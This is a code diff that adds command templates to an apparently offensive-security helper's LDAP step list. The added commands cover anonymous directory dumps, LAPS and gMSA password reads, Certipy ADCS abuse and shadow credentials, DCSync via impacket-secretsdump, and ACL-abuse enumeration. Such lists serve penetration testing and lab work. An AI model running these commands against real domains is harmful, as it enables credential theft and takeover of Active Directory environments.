@@ -4793,7 +4793,9 @@ _STEP_COMMANDS = {
     "ldap": {
         1: [
             "nxc ldap <RHOST> -u '' -p '' --users",
+            "nxc ldap <RHOST> -u '' -p '' --pass-pol",
             "ldapsearch -x -H ldap://<RHOST> -b 'DC=<DOMAIN>' -s base namingcontexts",
+            "ldapsearch -x -H ldap://<RHOST> -b 'DC=<DOMAIN>,DC=<TLD>' '(objectClass=*)'   # full anon dump",
             "windapsearch -d <DOMAIN> --dc-ip <RHOST> -u '' -U",
         ],
         2: [
@@ -4802,10 +4804,15 @@ _STEP_COMMANDS = {
         ],
         3: [
             "nxc ldap <RHOST> -u <USER> -p <PASS> -M laps",
+            "nxc ldap <RHOST> -u <USER> -p <PASS> --gmsa",
+            "nxc ldap <RHOST> -u <USER> -p <PASS> -M get-desc-users   # passwords in the description field",
             "bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -ns <RHOST> -c All",
         ],
         4: [
-            "# HackTricks LDAP: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap",
+            "certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <RHOST> -vulnerable -stdout   # ADCS ESC1-8",
+            "certipy shadow auto -u <USER>@<DOMAIN> -p <PASS> -account <TARGET>   # shadow credentials",
+            "impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@<RHOST>   # DCSync (with rights)",
+            "bloodyAD -u <USER> -p <PASS> -d <DOMAIN> --host <RHOST> get writable   # ACL abuse targets",
         ],
     },
     "kerberos": {
